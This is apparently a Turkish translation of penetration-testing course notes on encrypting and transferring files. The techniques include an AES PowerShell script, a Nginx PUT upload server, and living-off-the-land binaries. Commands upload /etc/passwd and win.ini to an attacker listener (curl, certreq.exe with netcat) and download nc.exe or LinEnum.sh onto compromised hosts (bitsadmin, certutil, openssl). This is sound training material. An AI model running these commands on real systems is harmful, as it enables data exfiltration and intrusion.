Sızma testi sırasında veri sızıntısı sızma testi yapan kişi, şirketi ve müşteri için ciddi sonuçlar doğurabilir. Bilgi güvenliği uzmanları olarak profesyonel ve sorumlu bir şekilde hareket etmeli ve bir değerlendirme sırasında karşılaştığımız verileri korumak için tüm önlemleri almalıyız.


## **Windows'ta Dosya Şifreleme**  

Windows sistemlerindeki dosyaları ve bilgileri şifrelemek için birçok farklı yöntem kullanılabilir. [En](“https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1”) basit yöntemlerden biri [Invoke-AESEncryption.ps1](“https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1”) PowerShell komut dosyasıdır. Bu betik küçüktür ve dosyaların ve dizelerin şifrelenmesini sağlar.

#### Invoke-AESEncryption.ps1
```powershell-session
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```


Bu dosyayı hedef hosta aktarmak için daha önce gösterilen dosya aktarma yöntemlerini kullanabiliriz. Kod aktarıldıktan sonra, aşağıda gösterildiği gibi yalnızca bir modül olarak içe aktarılması gerekir.


#### **Modülü İçe Aktar Invoke-AESEncryption.ps1**
```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```
Kod içe aktarıldıktan sonra, aşağıdaki örneklerde gösterildiği gibi dizeleri veya dosyaları şifreleyebilir. Bu komut, şifrelenmiş dosyayla aynı ada sahip ancak`“.aes`.” uzantılı bir şifrelenmiş dosya oluşturur.

#### File Encryption Example
```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

Sızma testi yapılan her şirkette şifreleme için çok `güçlü` ve `benzersiz` parolalar kullanılması şarttır. Bu, hassas dosyaların ve bilgilerin üçüncü bir tarafça sızdırılmış ve kırılmış olabilecek tek bir şifre kullanılarak deşifre edilmesini önlemek içindir.



## **Linux'ta Dosya Şifreleme**  

[OpenSSL](https://www.openssl.org/) sıklıkla Linux dağıtımlarına dahil edilir ve sistem yöneticileri diğer görevlerin yanı sıra güvenlik sertifikaları oluşturmak için kullanırlar. OpenSSL dosyaları şifrelemek için “nc tarzı” dosya göndermek için kullanılabilir.  

Bir dosyayı `openssl` kullanarak şifrelemek için farklı şifreler seçebiliriz, [OpenSSL man sayfasına](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html) bakın. Örnek olarak `-aes256` 'yı kullanalım. Ayrıca `-iter 100000` seçeneği ile varsayılan yineleme sayılarını geçersiz kılabilir ve Parola Tabanlı Anahtar Türetme İşlevi 2 algoritmasını kullanmak için `-pbkdf2` seçeneğini ekleyebiliriz. Enter tuşuna bastığımızda bir parola girmemiz gerekecek.


#### Encrypting /etc/passwd with openssl
```shell-session
M1R4CKCK@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:     
```

Yetkisiz bir tarafın dosyayı ele geçirmesi durumunda kaba kuvvet kırma saldırılarından kaçınmak için güçlü ve benzersiz bir parola kullanmayı unutmayın. Dosyanın şifresini çözmek için aşağıdaki komutu kullanabiliriz:


#### Decrypt passwd.enc with openssl
```shell-session
M1R4CKCK@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```

Bu dosyayı aktarmak için önceki yöntemlerden herhangi birini kullanabiliriz, ancak HTTPS, SFTP veya SSH gibi güvenli bir aktarım yöntemi kullanmanız önerilir. Her zaman olduğu gibi, bu bölümdeki örnekleri bu veya diğer modüllerdeki hedef hostlara karşı uygulayın ve yapabildiklerinizi yeniden üretin (Pwnbox kullanarak `openssl` örnekleri gibi. Bir sonraki bölümde HTTP ve HTTPS üzerinden dosya aktarmanın farklı yolları ele alınacaktır.

# **HTTP/S Üzerinden Dosya Yakalama**

## **HTTP/S**  

`HTTP/HTTPS` güvenlik duvarlarından geçmesine izin verilen en yaygın protokoller olduğu için web aktarımı çoğu insanın dosya aktarımında kullandığı en yaygın yoldur. Bir başka büyük avantajı da, çoğu durumda dosyanın aktarım sırasında şifrelenecek olmasıdır. Bir sızma testindeyken müşterinin ağ IDS'sinin hassas bir dosyanın düz metin üzerinden aktarıldığını tespit etmesi ve bulut sunucumuza neden şifreleme kullanmadan bir parola gönderdiğimizi sorması kadar kötü bir şey olamaz.  

Yükleme özelliklerine sahip bir web sunucusu kurmak için Python3 [uploadserver modülünü](https://github.com/Densaugeo/uploadserver) kullanmayı daha önce tartışmıştık, ancak Apache veya Nginx de kullanabiliriz. Bu bölümde dosya yükleme işlemleri için güvenli bir web sunucusu oluşturmayı ele alacağız.


## **Nginx - PUT'u Etkinleştirme**  

`Apache` 'ye dosya aktarmak için iyi bir alternatif [Nginx](“https://www.nginx.com/resources/wiki/”) 'tir çünkü yapılandırma daha az karmaşıktır ve modül sistemi `Apache` gibi güvenlik sorunlarına yol açmaz.  

`HTTP` yüklemelerine izin verirken, kullanıcıların web shell'lerini yükleyemeyeceklerinden ve çalıştıramayacaklarından %100 emin olmak çok önemlidir. `PHP` modülü `PHP` ile biten her şeyi çalıştırmayı sevdiğinden`Apache` bu konuda kendimizi ayağımızdan vurmamızı kolaylaştırır. `Nginx` 'i PHP kullanacak şekilde yapılandırmak bu kadar basit değildir.

#### **Yüklenen Dosyaları İşlemek için Bir Dizin Oluşturun**
```shell-session
M1R4CKCK@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### **Sahibini www-data olarak değiştirin**
```shell-session
M1R4CKCK@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### **Nginx Yapılandırma Dosyası Oluşturma**  

İçeriğiyle birlikte `/etc/nginx/sites-available/upload.conf` dosyasını oluşturarak Nginx yapılandırma dosyasını oluşturun:

```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### **Symlink Sitemizi Siteler Etkin Dizinine Bağlayın**

```shell-session
M1R4CKCK@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Start Nginx

```shell-session
M1R4CKCK@htb[/htb]$ sudo systemctl restart nginx.service
```

Eğer herhangi bir hata mesajı alırsak `/var/log/nginx/error.log` dosyasını kontrol edin. Eğer Pwnbox kullanıyorsak, 80 numaralı portun zaten kullanımda olduğunu göreceğiz.

#### **Hataların Doğrulanması**

```shell-session
M1R4CKCK@htb[/htb]$ tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```


```shell-session
M1R4CKCK@htb[/htb]$ ss -lnpt | grep 80

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```

```shell-session
M1R4CKCK@htb[/htb]$ ps -ef | grep 2811

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

Zaten 80 numaralı portu dinleyen bir modül olduğunu görüyoruz. Bunu aşmak için, 80 numaralı porta bağlanan varsayılan Nginx yapılandırmasını kaldırabiliriz.

#### Remove NginxDefault Configuration
```shell-session
M1R4CKCK@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```

Şimdi bir `PUT` isteği göndermek için `cURL` kullanarak yükleme işlemini test edebiliriz. Aşağıdaki örnekte, `/etc/passwd` dosyasını sunucuya yükleyeceğiz ve users.txt olarak adlandıracağız

#### Upload File Using cURL
```shell-session
M1R4CKCK@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```shell-session
M1R4CKCK@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```

Bunu çalıştırdıktan sonra, `http://localhost/SecretUploadDirectory` adresine giderek dizin listelemenin etkinleştirilmediğinden emin olmak iyi bir testtir. `Apache` varsayılan olarak, dizin dosyası (index.html) olmayan bir dizine girdiğimizde tüm dosyaları listeleyecektir. Bu, dosyaları exfilling olarak kullanma durumumuz için kötüdür çünkü çoğu dosya doğası gereği hassastır ve onları gizlemek için elimizden gelenin en iyisini yapmak isteriz. `Nginx` 'in minimal olması sayesinde, bu gibi özellikler varsayılan olarak etkin değildir.

## **Yerleşik Araçları Kullanma**  

Bir sonraki bölümde, “Arazide Yaşamak” konusunu veya dosya aktarım faaliyetlerini gerçekleştirmek için yerleşik Windows ve Linux yardımcı programlarını kullanmayı tanıtacağız. Windows ve Linux ayrıcalık yükseltme ve Active Directory numaralandırma ve istismar gibi görevleri ele alırken Penetrasyon Test Cihazı yolundaki modüller boyunca bu konsepte tekrar tekrar geri döneceğiz.


# Living off The Land
“Living off the land” ifadesi Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) ve Matt Graeber [@mattifestation](https://twitter.com/mattifestation) tarafından [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw)'te ortaya atılmıştır.  

LOLBins (Living off the Land binaries) terimi, bir saldırganın asıl amacının ötesinde eylemler gerçekleştirmek için kullanabileceği binary'lere ne ad verileceğine ilişkin bir Twitter tartışmasından ortaya çıkmıştır. Şu anda Living off the Land binary'leri hakkında bilgi toplayan iki web sitesi bulunmaktadır:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binary'leri aşağıdaki gibi işlevleri gerçekleştirmek için kullanılabilir:
- İndir  
- Yükle  
- Komut Yürütme  
- Dosya Okuma  
- Dosya Yazma  
- Baypaslar

Bu bölümde LOLBAS ve GTFOBins projelerinin kullanımına odaklanılacak ve Windows ve Linux sistemlerinde indirme ve yükleme işlevleri için örnekler verilecektir.

## **LOLBAS ve GTFOBins Projesini Kullanma**  

[Windows için LOLBAS](“https://lolbas-project.github.io/#”) ve [Linux için GTFOBins](“https://gtfobins.github.io/”), farklı işlevler için kullanabileceğimiz binary'leri arayabileceğimiz web siteleridir.

### LOLBAS  

[LOLBAS](“https://lolbas-project.github.io/”) 'ta indirme ve yükleme işlevlerini aramak için `/download` veya `/upload` kullanabiliriz.

![Pasted image 20241101025931.png](/img/user/resimler/Pasted%20image%2020241101025931.png)

Örnek olarak [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) 'yi kullanalım.  

Netcat kullanarak gelen trafik için saldırı hostumuzdaki bir portu dinlememiz ve ardından bir dosya yüklemek için certreq.exe dosyasını çalıştırmamız gerekiyor.

#### Upload win.ini to our Pwnbox
```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT
```

Bu, dosyayı Netcat oturumumuza gönderir ve içeriğini kopyalayıp yapıştırabiliriz.


#### **Netcat Oturumumuzda Alınan Dosya**
```shell-session
M1R4CKCK@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

`certreq.exe` dosyasını çalıştırırken bir hata alırsanız, kullandığınız sürüm `-Post` parametresini içermiyor olabilir. Güncellenmiş bir sürümü [buradan](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) indirebilir ve tekrar deneyebilirsiniz.


### GTFOBins  

[Linux Binaries için GTFOBins](“https://gtfobins.github.io/”)'de indirme ve yükleme işlevini aramak için `+dosya indirme` veya `+dosya yükleme` kullanabiliriz.

![Pasted image 20241101030134.png](/img/user/resimler/Pasted%20image%2020241101030134.png)

[OpenSSL](“https://www.openssl.org/”) kullanalım. Sıklıkla kurulur ve genellikle diğer yazılım dağıtımlarına dahil edilir, sistem yöneticileri diğer görevlerin yanı sıra güvenlik sertifikaları oluşturmak için kullanır. OpenSSL “nc tarzı” dosya göndermek için kullanılabilir.  

Pwnbox'ımızda bir sertifika oluşturmamız ve bir sunucu başlatmamız gerekiyor.


#### Create Certificate in our Pwnbox

```shell-session
M1R4CKCK@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```


#### **Pwnbox'ımızda Sunucuyu Ayağa Kaldırın**
```shell-session
M1R4CKCK@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Daha sonra, sunucu çalışırken, dosyayı ele geçirilen makineden indirmemiz gerekir.

#### **Tehlikeye Düşmüş Makineden Dosya İndirme**

```shell-session
M1R4CKCK@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## **Diğer Yaygın Arazide Yaşam Araçları**
### Bitsadmin İndirme işlevi  

[Arka Plan Akıllı Aktarım Hizmeti (BITS)](“https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal”) HTTP sitelerinden ve SMB paylaşımlarından dosya indirmek için kullanılabilir. Kullanıcının ön plandaki çalışması üzerindeki etkiyi en aza indirmek için host ve ağ kullanımını “akıllıca” kontrol eder.

#### File Download with Bitsadmin

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell ayrıca BITS ile etkileşimi mümkün kılar, dosya indirme ve yüklemeyi sağlar, kimlik bilgilerini destekler ve belirtilen proxy sunucularını kullanabilir.

#### Download
```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil  

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) Certutil'in rastgele dosyaları indirmek için kullanılabileceğini keşfetti. Tüm Windows sürümlerinde mevcuttur ve Windows için defacto `wget` olarak hizmet veren popüler bir dosya aktarım tekniği olmuştur. Ancak, Kötü Amaçlı Yazılım Önleme Tarama Arayüzü (AMSI) şu anda bunu kötü amaçlı Certutil kullanımı olarak algılamaktadır.

#### Download a File with Certutil
```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```


## **Ekstra Alıştırma**  

LOLBAS ve GTFOBins web sitelerini incelemeye ve mümkün olduğunca çok sayıda dosya aktarım yöntemini denemeye değer. Ne kadar belirsiz olursa o kadar iyi. Bir değerlendirme sırasında bu ikililerden birine ne zaman ihtiyaç duyacağınızı asla bilemezsiniz ve birden fazla seçenek hakkında ayrıntılı notlara sahip olmanız size zaman kazandıracaktır. Dosya transferleri için kullanılabilecek bazı ikililer sizi şaşırtabilir.  

Son iki bölümde, dosya aktarımlarıyla ilgili tespit hususlarına ve değerlendirmemizin kapsamı kaçamak testler gerektiriyorsa tespitten kaçınmak için atabileceğimiz bazı adımlara değineceğiz.
